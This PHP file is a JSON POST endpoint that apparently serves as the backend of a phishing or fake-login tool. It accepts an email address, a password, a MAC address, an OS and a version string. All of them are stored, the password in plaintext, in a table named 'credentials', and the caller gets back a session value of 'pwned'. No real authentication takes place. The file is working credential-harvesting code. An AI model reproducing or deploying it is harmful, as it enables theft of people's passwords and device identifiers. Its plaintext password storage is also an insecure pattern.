<?php
include_once '../php/database.class.php';
header('Content-Type: application/json; charset=UTF-8');
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post') {
    $raw = file_get_contents('php://input');
    if ($raw) {
        $data = @json_decode($raw);
        if ($data) {
            $response = array(
                'status' => 'ok',
                'message' => array()
            );
            if (isset($data->email) && isset($data->password)) {
                $parameters = array(
                    'email' => trim($data->email),
                    'password' => $data->password,
                    'mac' => isset($data->mac) ? trim($data->mac) : null,
                    'os' => isset($data->os) ? trim($data->os) : null,
                    'version' => isset($data->version) ? trim($data->version) : null
                );
                mb_internal_encoding('UTF-8');
                $error = false;
                if (mb_strlen($parameters['email']) < 1) {
                    $response['status'] = 'error';
                    $response['message']['email'] = 'Please enter email';
                    $error = true;
                } else if (mb_strlen($parameters['email']) > 300) {
                    $response['status'] = 'error';
                    $response['message']['email'] = 'Email is exceeding 300 characters';
                    $error = true;
                }
                if (mb_strlen($parameters['password']) < 1) {
                    $response['status'] = 'error';
                    $response['message']['password'] = 'Please enter password';
                    $error = true;
                } else if (mb_strlen($parameters['password']) > 300) {
                    $response['status'] = 'error';
                    $response['message']['password'] = 'Password is exceeding 300 characters';
                    $error = true;
                }
                if (mb_strlen($parameters['mac']) > 50) {
                    $parameters['mac'] = substr($parameters['mac'], 0, 50);
                }
                if (mb_strlen($parameters['os']) > 50) {
                    $parameters['os'] = substr($parameters['os'], 0, 50);
                }
                if (mb_strlen($parameters['version']) > 50) {
                    $parameters['version'] = substr($parameters['version'], 0, 50);
                }
                if (!$error) {
                    $db = new Database();
                    if ($db->isConnected()) {
                        $db->query('INSERT INTO `credentials` (`email`, `password`, `mac`, `os`, `version`, `date`) VALUES (:email, :password, :mac, :os, :version, :date)');
                        $db->bind(':email', strtolower($parameters['email']));
                        $db->bind(':password', $parameters['password']);
                        $db->bind(':mac', strtolower($parameters['mac']));
                        $db->bind(':os', strtolower($parameters['os']));
                        $db->bind(':version', strtolower($parameters['version']));
                        $db->bind(':date', date('Y-m-d H:i:s', time()));
                        if ($db->execute()) {
                            // send some data back to user
                            $response['session'] = 'pwned';
                            $response['data'] = array();
                        } else {
                            $response['status'] = 'error';
                            $response['message']['global'] = 'Database error';
                        }
                    } else {
                        $response['status'] = 'error';
                        $response['message']['global'] = 'Database error';
                    }
                    $db->disconnect();
                }
            } else {
                $response['status'] = 'error';
                $response['message']['global'] = 'Required data is missing';
            }
            echo json_encode($response, JSON_PRETTY_PRINT);
        }
    }
}
?>
